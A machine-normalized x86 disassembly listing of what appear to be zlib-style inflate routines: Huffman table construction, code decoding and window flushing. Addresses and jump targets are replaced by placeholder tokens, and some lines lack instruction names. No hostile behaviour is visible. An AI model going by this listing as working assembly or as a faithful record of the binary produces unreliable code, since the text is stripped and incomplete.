cmp [ esp + 0x28 ] 0xa
jb r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x8 ]
lea eax [ eax + ecx * 8 ]
xor ecx ecx
mov [ esp + 0x18 ] eax
mov cl [ eax + 0x1 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x1c ] ecx
mov [ esp + 0x24 ] eax
mov eax ecx
sub ebx eax
mov eax [ esp + 0x18 ]
xor ecx ecx
mov cl [ eax ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
add [ eax + 0x4 ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x24 ] eax
mov eax ecx
sub ebx eax
mov eax [ esp + 0x10 ]
xor ecx ecx
mov cl [ eax + 0x11 ]
mov [ eax ] 0x3
mov [ eax + 0xc ] ecx
mov ecx [ eax + 0x18 ]
mov [ eax + 0x8 ] ecx
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x8 ]
lea eax [ eax + ecx * 8 ]
xor ecx ecx
mov [ esp + 0x18 ] eax
mov cl [ eax + 0x1 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x1c ] ecx
sub ebx ecx
xor ecx ecx
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x18 ]
mov cl [ eax ]
test cl 0x10
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
add [ eax + 0xc ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x24 ] eax
mov eax ecx
sub ebx eax
mov eax [ esp + 0x10 ]
mov [ eax ] 0x5
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x2c ]
sub ecx eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x1c ] ecx
jmp r-xdata
mov cl [ eax + 0x8 ]
mov [ esp + 0x2c ] 0x0
mov [ edx ] cl
mov ecx [ esp + 0x14 ]
inc edx
dec ecx
mov [ esp + 0x14 ] ecx
mov [ eax ] 0x0
jmp r-xdata
mov eax [ esi + 0x2c ]
cmp edx eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_40a660
mov edx [ esi + 0x34 ]
mov ecx [ esi + 0x30 ]
add esp 0xc
cmp ecx edx
je r-xdata
mov ecx [ esp + 0x28 ]
sub ebx 0x8
inc ecx
dec ebp
mov [ esp + 0x28 ] ecx
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov eax ebp
mov [ edi + 0x4 ] ecx
mov ecx [ edi + 0x8 ]
sub eax ebx
mov [ edi ] ebp
add ecx eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] ecx
mov [ esi + 0x34 ] edx
mov ecx [ eax + 0x18 ]
mov edx [ eax + 0x14 ]
push edi
push esi
push ecx
push edx
xor ecx ecx
xor edx edx
mov cl [ eax + 0x11 ]
mov dl [ eax + 0x10 ]
push ecx
push edx
call sub_40a7a0
mov ecx [ edi + 0x4 ]
mov edx [ esi + 0x20 ]
mov ebp [ edi ]
mov ebx [ esi + 0x1c ]
mov [ esp + 0x40 ] ecx
mov ecx [ esi + 0x30 ]
mov [ esp + 0x3c ] edx
mov edx [ esi + 0x34 ]
add esp 0x18
cmp edx ecx
mov [ esp + 0x2c ] eax
jae r-xdata
test cl 0x10
je r-xdata
mov ecx [ eax + 0x4 ]
mov eax [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov [ eax ] 0x6
jmp r-xdata
mov eax [ esp + 0x24 ]
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] eax
mov ebx [ edi ]
mov eax [ edi + 0x8 ]
mov ecx ebp
sub ecx ebx
mov [ edi + 0x4 ] 0x0
add eax ecx
mov [ edi ] ebp
mov [ edi + 0x8 ] eax
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
test cl 0x40
jne r-xdata
mov eax [ esp + 0x10 ]
and ecx 0xf
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov ecx [ ecx + 0x4 ]
mov [ eax ] 0x4
mov [ eax + 0xc ] ecx
jmp r-xdata
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
jne r-xdata
add eax ecx
mov ecx [ esi + 0x28 ]
cmp eax ecx
jb r-xdata
mov ecx [ eax ]
cmp ecx 0x9
ja r-xdata
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_40a660
mov edx [ esi + 0x34 ]
mov [ esp + 0x38 ] eax
mov eax [ esi + 0x30 ]
add esp 0xc
cmp edx eax
jae r-xdata
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] 0x8
mov ecx [ esp + 0x24 ]
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ecx
mov ecx [ esp + 0x28 ]
mov ebx [ edi ]
mov [ edi + 0x4 ] ecx
mov ecx ebp
push eax
sub ecx ebx
mov ebx [ edi + 0x8 ]
add ebx ecx
push edi
mov [ edi + 0x8 ] ebx
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov ecx [ esi + 0x2c ]
sub ecx edx
sub ecx edx
dec ecx
jmp r-xdata
test cl 0x40
jne r-xdata
mov eax [ esp + 0x10 ]
and ecx 0xf
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov ecx [ ecx + 0x4 ]
mov [ eax ] 0x2
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] 0x9
mov [ edi + 0x18 ] rw-data
jmp r-xdata
mov ecx [ esp + 0x18 ]
inc edx
mov [ esp + 0x2c ] 0x0
mov cl [ ecx ]
mov [ edx - 0x1 ] cl
mov ecx [ esp + 0x18 ]
inc ecx
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x14 ]
dec ecx
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x18 ]
cmp ecx [ esi + 0x2c ]
jne r-xdata
mov eax [ esi + 0x2c ]
cmp edx eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov ecx [ esp + 0x1c ]
mov [ esp + 0x18 ] eax
mov ecx [ esi + 0x2c ]
sub ecx edx
mov ecx eax
sub ecx edx
dec ecx
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
mov ecx [ esp + 0x10 ]
dec eax
neg eax
sbb eax eax
and eax 0x2
add eax 0x7
mov [ ecx ] eax
mov eax ecx
jmp r-xdata
test eax eax
mov [ esp + 0x14 ] ecx
je r-xdata
mov eax [ esp + 0x10 ]
test cl 0x20
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax + 0xc ] ecx
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x4 ]
lea ecx [ eax + ecx * 8 ]
mov eax [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov ecx [ eax + 0x4 ]
dec ecx
mov [ eax + 0x4 ] ecx
jne r-xdata
mov ecx [ esi + 0x28 ]
mov [ esp + 0x18 ] ecx
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_40a660
mov edx [ esi + 0x34 ]
mov [ esp + 0x38 ] eax
mov eax [ esi + 0x30 ]
add esp 0xc
cmp edx eax
jae r-xdata
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov [ esp + 0x14 ] ecx
mov ecx [ esi + 0x2c ]
cmp edx ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov [ eax ] 0x9
mov [ edi + 0x18 ] rw-data
jmp r-xdata
mov [ eax ] 0x7
jmp r-xdata
mov ecx [ esi + 0x2c ]
sub ecx edx
mov ecx eax
sub ecx edx
dec ecx
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov eax ebp
mov [ edi + 0x4 ] ecx
mov ecx [ edi + 0x8 ]
sub eax ebx
mov [ edi ] ebp
add ecx eax
mov [ edi + 0x8 ] ecx
mov ecx [ esp + 0x2c ]
push ecx
push edi
push esi
mov [ esi + 0x34 ] edx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x10 ]
mov edx ecx
cmp edx eax
jae r-xdata
test eax eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esi + 0x20 ] ecx
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov ecx ebp
mov [ edi + 0x4 ] eax
mov eax [ edi + 0x8 ]
sub ecx ebx
push 0xfffffffd
add eax ecx
push edi
mov [ edi + 0x8 ] eax
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov [ esp + 0x14 ] ecx
mov ecx [ esi + 0x2c ]
cmp edx ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov eax [ esp + 0x10 ]
mov edx ecx
cmp edx eax
jae r-xdata
test eax eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov [ esp + 0x14 ] eax
sub_409f30
push ecx
push ebx
push edi
mov edi [ esp + 0x20 ]
push 0x4
push 0x13
mov [ esp + 0x10 ] 0x0
mov eax [ edi + 0x28 ]
push eax
call [ edi + 0x20 ]
mov ebx eax
add esp 0xc
test ebx ebx
jne r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
push ebp
mov ebp [ esp + 0x18 ]
push esi
lea ecx [ esp + 0x10 ]
push ebx
push ecx
mov ecx [ esp + 0x20 ]
push edx
push ebp
push eax
push 0x0
push 0x0
push 0x13
push 0x13
push ecx
call sub_409fe0
mov esi eax
add esp 0x28
cmp esi 0xfffffffd
jne r-xdata
pop edi
mov eax 0xfffffffc
pop ebx
pop ecx
retn
cmp esi 0xfffffffb
je r-xdata
mov edx [ edi + 0x28 ]
push ebx
push edx
mov [ edi + 0x18 ] rw-data
call [ edi + 0x24 ]
add esp 0x8
mov eax esi
pop esi
pop ebp
pop edi
pop ebx
pop ecx
retn
mov [ edi + 0x18 ] rw-data
mov esi 0xfffffffd
cmp [ ebp ] 0x0
jne r-xdata
mov edx [ edi + 0x28 ]
push ebx
push edx
call [ edi + 0x24 ]
add esp 0x8
mov eax esi
pop esi
pop ebp
pop edi
pop ebx
pop ecx
retn
sub_409fe0
sub esp 0x100
mov ecx [ esp + 0x104 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x114 ]
push edi
xor edi edi
mov edx esi
mov [ esp + 0x54 ] edi
mov [ esp + 0x58 ] edi
mov [ esp + 0x5c ] edi
mov [ esp + 0x60 ] edi
mov [ esp + 0x64 ] edi
mov [ esp + 0x68 ] edi
mov [ esp + 0x6c ] edi
mov [ esp + 0x70 ] edi
mov [ esp + 0x74 ] edi
mov [ esp + 0x78 ] edi
mov [ esp + 0x7c ] edi
mov [ esp + 0x80 ] edi
mov [ esp + 0x84 ] edi
mov [ esp + 0x88 ] edi
mov [ esp + 0x8c ] edi
mov [ esp + 0x90 ] edi
mov eax [ ecx ]
add ecx 0x4
mov ebp [ esp + eax * 4 + 0x54 ]
lea eax [ esp + eax * 4 + 0x54 ]
inc ebp
dec edx
mov [ eax ] ebp
jne r-xdata
cmp [ esp + 0x54 ] esi
jne r-xdata
mov ebx [ esp + 0x12c ]
mov ecx 0x1
lea eax [ esp + 0x58 ]
mov ebp [ ebx ]
mov [ esp + 0x10 ] ebp
mov ecx [ esp + 0x128 ]
mov edx [ esp + 0x12c ]
mov [ ecx ] edi
mov [ edx ] edi
mov eax ecx
cmp ebp ecx
mov [ esp + 0x14 ] eax
jae r-xdata
inc ecx
add eax 0x4
cmp ecx 0xf
jbe r-xdata
mov edx 0xf
lea esi [ esp + 0x90 ]
mov [ esp + 0x10 ] ecx
mov ebp ecx
cmp [ eax ] edi
jne r-xdata
cmp ebp edx
mov [ esp + 0x2c ] edx
jbe r-xdata
dec edx
sub esi 0x4
cmp edx edi
jne r-xdata
mov esi 0x1
mov [ ebx ] ebp
shl esi cl
cmp ecx edx
jae r-xdata
mov [ esp + 0x10 ] edx
mov ebp edx
cmp [ esi ] edi
jne r-xdata
lea ecx [ edx * 4 ]
mov [ esp + 0x20 ] ecx
mov ebx [ esp + ecx + 0x54 ]
lea ecx [ esp + ecx + 0x54 ]
sub esi ebx
mov [ esp + 0x44 ] esi
jns r-xdata
lea ebx [ esp + ecx * 4 + 0x54 ]
add ebx esi
mov [ esp + 0x98 ] edi
mov [ ecx ] ebx
xor ecx ecx
dec edx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffd
pop ebx
add esp 0x100
retn
inc ecx
add ebx 0x4
shl esi 0x1
cmp ecx edx
jb r-xdata
mov edx [ esp + 0x114 ]
xor ebx ebx
xor ebx ebx
sub esi [ ebx ]
js r-xdata
mov ecx [ esp + 0x118 ]
inc ebx
cmp ebx ecx
jb r-xdata
mov edx [ esp + ecx * 4 + 0x94 ]
mov esi [ esp + 0x138 ]
lea ecx [ esp + ecx * 4 + 0x94 ]
mov [ esi + edx * 4 ] ebx
mov esi [ esp + 0x44 ]
inc edx
mov [ ecx ] edx
mov edx [ esp + 0x1c ]
add ecx [ esp + ebx + 0x58 ]
add ebx 0x4
dec edx
mov [ esp + ebx + 0x98 ] ecx
jne r-xdata
mov ecx [ edx ]
add edx 0x4
cmp ecx edi
mov [ esp + 0x1c ] edx
je r-xdata
mov ecx [ esp + 0x20 ]
mov ebx ebp
neg ebx
mov edx [ esp + ecx + 0x94 ]
mov ecx [ esp + 0x138 ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x2c ]
cmp eax ecx
mov [ esp + 0x118 ] edx
mov [ esp + 0x38 ] edi
mov [ esp + 0x94 ] edi
mov [ esp + 0x18 ] 0xffffffff
mov [ esp + 0xd4 ] edi
mov [ esp + 0x40 ] edi
mov [ esp + 0x3c ] edi
jg r-xdata
cmp esi edi
je r-xdata
mov esi [ esp + 0x34 ]
lea edx [ eax - 0x1 ]
lea ecx [ esp + eax * 4 + 0x54 ]
mov [ esp + 0x20 ] edx
mov [ esp + 0x28 ] ecx
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x100
retn
cmp [ esp + 0x2c ] 0x1
je r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x20 ]
add ecx 0x4
inc eax
mov [ esp + 0x28 ] ecx
mov ecx [ esp + 0x2c ]
inc edx
cmp eax ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x20 ] edx
jle r-xdata
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffb
pop ebx
add esp 0x100
retn
mov edx [ esp + 0x28 ]
mov edx [ edx ]
mov ecx edx
dec edx
test ecx ecx
mov [ esp + 0x24 ] edx
je r-xdata
mov esi [ esp + 0x44 ]
xor edi edi
lea ecx [ ebx + ebp ]
cmp eax ecx
jle r-xdata
mov ecx [ esp + 0x138 ]
mov dl al
mov ebp [ esp + 0x1c ]
sub dl bl
mov [ esp + 0x31 ] dl
mov edx [ esp + 0x118 ]
lea ecx [ ecx + edx * 4 ]
cmp ebp ecx
jb r-xdata
inc edx
mov [ esp + 0x50 ] edx
jmp r-xdata
mov esi [ ebp ]
mov ecx [ esp + 0x11c ]
cmp esi ecx
jae r-xdata
mov [ esp + 0x30 ] 0xc0
jmp r-xdata
mov edx [ esp + 0x18 ]
add ebx ebp
inc edx
add ecx ebp
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x2c ]
sub edx ebx
mov [ esp + 0x48 ] ecx
cmp edx ebp
jbe r-xdata
sub esi ecx
mov ecx [ esp + 0x124 ]
shl esi 0x2
mov dl [ esi + ecx ]
mov ecx [ esp + 0x120 ]
add dl 0x50
mov esi [ esi + ecx ]
mov [ esp + 0x30 ] dl
cmp esi 0x100
sbb dl dl
and dl 0xa0
add dl 0x60
mov [ esp + 0x30 ] dl
jmp r-xdata
mov ecx eax
mov edx 0x1
sub ecx ebx
mov eax edi
shl edx cl
mov ecx ebx
shr eax cl
cmp eax [ esp + 0x3c ]
jae r-xdata
mov edi [ esp + 0x50 ]
mov ecx eax
sub ecx ebx
mov eax 0x1
shl eax cl
cmp eax edi
jbe r-xdata
mov edx ebp
mov ecx [ esp + 0x20 ]
mov eax 0x1
shl eax cl
test edi eax
je r-xdata
mov ecx [ esp + 0x40 ]
lea ecx [ ecx + eax * 8 ]
add ebp 0x4
mov [ esp + 0x1c ] ebp
mov ebp [ esp + 0x134 ]
mov edx 0x1
shl edx cl
mov eax [ ebp ]
mov [ esp + 0x3c ] edx
add edx eax
cmp edx 0x5a0
ja r-xdata
mov ebp [ esp + 0x24 ]
or edi 0xffffffff
sub edi ebp
mov ebp [ esp + 0x28 ]
add eax edi
cmp ecx edx
jae r-xdata
mov edx [ esp + 0x18 ]
mov ebp 0x1
mov ecx ebx
xor edi eax
shl ebp cl
mov ecx [ esp + edx * 4 + 0x94 ]
lea eax [ esp + edx * 4 + 0x94 ]
mov [ esp + 0x38 ] edi
dec ebp
and ebp edi
cmp ebp ecx
je r-xdata
xor edi eax
shr eax 0x1
test edi eax
jne r-xdata
mov ebp [ esp + 0x30 ]
add eax edx
mov [ ecx ] ebp
lea ebp [ edx * 8 ]
mov [ ecx + 0x4 ] esi
add ecx ebp
cmp eax [ esp + 0x3c ]
jb r-xdata
mov edi [ esp + 0x130 ]
mov [ ebp ] edx
mov edx [ esp + 0x18 ]
lea eax [ edi + eax * 8 ]
mov edi [ esp + 0x18 ]
test edx edx
lea edi [ esp + edi * 4 + 0xd4 ]
mov [ esp + 0x40 ] eax
mov [ esp + 0x4c ] edi
mov [ edi ] eax
je r-xdata
inc ecx
cmp ecx edx
jae r-xdata
mov eax [ esp + 0x24 ]
mov ebp [ esp + 0x10 ]
mov edx eax
dec eax
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x14 ]
test edx edx
jne r-xdata
mov ebp [ esp + 0x10 ]
dec edx
sub ebx ebp
mov ebp 0x1
mov ecx ebx
sub eax 0x4
shl ebp cl
mov ecx [ eax ]
dec ebp
and ebp edi
cmp ebp ecx
jne r-xdata
mov ecx [ esp + 0x128 ]
mov edi [ esp + 0x38 ]
mov [ ecx ] eax
mov edi [ esp + 0x38 ]
mov eax [ esp + 0x10 ]
mov esi [ esp + 0x40 ]
mov [ esp + 0x30 ] cl
mov ecx ebx
mov [ esp + edx * 4 + 0x94 ] edi
mov edx [ esp + 0x4c ]
mov [ esp + 0x31 ] al
sub ecx eax
mov eax edi
shr eax cl
mov ecx [ edx - 0x4 ]
mov edx [ esp + 0x30 ]
sub esi ecx
sar esi 0x3
sub esi eax
mov [ ecx + eax * 8 ] edx
mov [ ecx + eax * 8 + 0x4 ] esi
jmp r-xdata
mov edi [ ebp + 0x4 ]
add ebp 0x4
shl eax 0x1
cmp eax edi
jbe r-xdata
mov edx [ esp + 0x24 ]
mov [ esp + 0x18 ] edx
mov ebp [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x14 ]
cmp eax ecx
jg r-xdata
sub eax edi
inc ecx
cmp ecx edx
jb r-xdata
sub_40a4a0
push ecx
push ebx
mov ebx [ esp + 0x2c ]
push ebp
push esi
mov eax [ ebx + 0x28 ]
push edi
push 0x4
push 0x120
push eax
mov [ esp + 0x1c ] 0x0
call [ ebx + 0x20 ]
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x24 ]
mov ebp [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
push edi
push ecx
mov ecx [ esp + 0x34 ]
push edx
mov edx [ esp + 0x2c ]
push eax
push ecx
push r--data
push r--data
push 0x101
push ebp
push edx
call sub_409fe0
mov esi eax
add esp 0x28
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffc
pop ebx
pop ecx
retn
cmp esi 0xfffffffd
jne r-xdata
mov eax [ esp + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfffffffc
je r-xdata
mov edx [ ebx + 0x28 ]
push edi
push edx
mov [ ebx + 0x18 ] rw-data
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov [ ebx + 0x18 ] rw-data
mov esi 0xfffffffd
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x28 ]
lea ecx [ esp + 0x10 ]
push edi
push ecx
mov ecx [ esp + 0x38 ]
push edx
mov edx [ esp + 0x28 ]
push eax
mov eax [ esp + 0x30 ]
push ecx
push r--data
push r--data
push esi
lea ecx [ eax + ebp * 4 ]
push edx
push ecx
call sub_409fe0
mov esi eax
add esp 0x28
test esi esi
jne r-xdata
mov edx [ ebx + 0x28 ]
push edi
push edx
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
cmp esi 0xfffffffd
jne r-xdata
mov edx [ esp + 0x28 ]
cmp [ edx ] 0x0
jne r-xdata
cmp esi 0xfffffffb
jne r-xdata
mov ecx [ ebx + 0x28 ]
push edi
push ecx
mov [ ebx + 0x18 ] rw-data
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ ebx + 0x28 ]
push edi
push eax
call [ ebx + 0x24 ]
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
cmp ebp 0x101
ja r-xdata
cmp esi 0xfffffffc
je r-xdata
mov ecx [ ebx + 0x28 ]
push edi
push ecx
mov [ ebx + 0x18 ] rw-data
mov esi 0xfffffffd
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov [ ebx + 0x18 ] rw-data
mov esi 0xfffffffd
mov ecx [ ebx + 0x28 ]
push edi
push ecx
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_40a660
push ecx
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
mov esi [ esp + 0x18 ]
mov ebp [ ebx + 0x34 ]
push edi
mov edi [ ebx + 0x30 ]
mov eax [ esi + 0xc ]
cmp edi ebp
mov [ esp + 0x10 ] eax
mov [ esp + 0x18 ] edi
jbe r-xdata
mov eax [ esi + 0x10 ]
sub ebp edi
cmp ebp eax
jbe r-xdata
mov ebp [ ebx + 0x2c ]
test ebp ebp
je r-xdata
mov ebp eax
mov edx [ esi + 0x14 ]
sub eax ebp
add edx ebp
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] edx
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
cmp [ esp + 0x20 ] 0xfffffffb
jne r-xdata
mov ecx ebp
mov esi edi
mov edi [ esp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov ecx edx
and ecx 0x3
add eax ebp
[ edi ] [ esi ]
mov edi [ esp + 0x10 ]
mov ecx [ ebx + 0x2c ]
add edi ebp
cmp eax ecx
mov [ esp + 0x10 ] edi
jne r-xdata
mov ecx [ ebx + 0x3c ]
push ebp
push edi
push ecx
call eax
mov [ ebx + 0x3c ] eax
add esp 0xc
mov [ esi + 0x30 ] eax
mov [ esp + 0x20 ] 0x0
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x10 ]
pop edi
pop esi
mov [ ecx + 0xc ] edx
mov [ ebx + 0x30 ] eax
mov eax [ esp + 0x18 ]
pop ebp
pop ebx
pop ecx
retn
mov eax [ ebx + 0x34 ]
mov esi [ ebx + 0x28 ]
cmp eax ecx
mov [ esp + 0x18 ] esi
jne r-xdata
mov edi [ esp + 0x1c ]
mov ebp [ ebx + 0x34 ]
sub ebp esi
mov eax [ edi + 0x10 ]
cmp ebp eax
jbe r-xdata
mov [ ebx + 0x34 ] esi
test ebp ebp
je r-xdata
mov ebp eax
mov edx [ edi + 0x14 ]
sub eax ebp
add edx ebp
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] edx
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
cmp [ esp + 0x20 ] 0xfffffffb
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx ebp
mov edx ecx
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
add eax ebp
mov ecx edx
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x18 ]
and ecx 0x3
add eax ebp
[ edi ] [ esi ]
mov [ esp + 0x18 ] eax
mov ecx [ ebx + 0x3c ]
push ebp
push esi
push ecx
call eax
mov [ ebx + 0x3c ] eax
add esp 0xc
mov [ edi + 0x30 ] eax
mov [ esp + 0x20 ] 0x0
sub_40a7a0
sub esp 0x14
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x28 ]
push ebx
push ebp
mov ebp [ eax ]
mov eax [ eax + 0x4 ]
mov edx [ ecx + 0x20 ]
push esi
mov esi [ ecx + 0x30 ]
push edi
mov edi [ ecx + 0x34 ]
mov [ esp + 0x10 ] eax
mov eax [ ecx + 0x1c ]
cmp edi esi
mov [ esp + 0x18 ] ebp
jae r-xdata
mov ecx [ ecx + 0x2c ]
sub ecx edi
mov [ esp + 0x14 ] ecx
sub esi edi
dec esi
mov [ esp + 0x14 ] esi
jmp r-xdata
mov ecx [ esp + 0x1c ]
mov esi [ esp + 0x30 ]
and ecx edx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
test ebx ebx
je r-xdata
mov ecx [ esp + 0x10 ]
dec ecx
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ ebp ]
mov esi ecx
mov ecx eax
shl esi cl
add eax 0x8
or edx esi
inc ebp
cmp eax 0x14
jb r-xdata
mov ecx [ esp + 0x28 ]
mov ecx [ ecx * 4 + rw-data ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x2c ]
mov ecx [ ecx * 4 + rw-data ]
mov [ esp + 0x20 ] ecx
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov cl [ esi + 0x4 ]
mov [ edi ] cl
mov ecx [ esp + 0x14 ]
inc edi
dec ecx
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
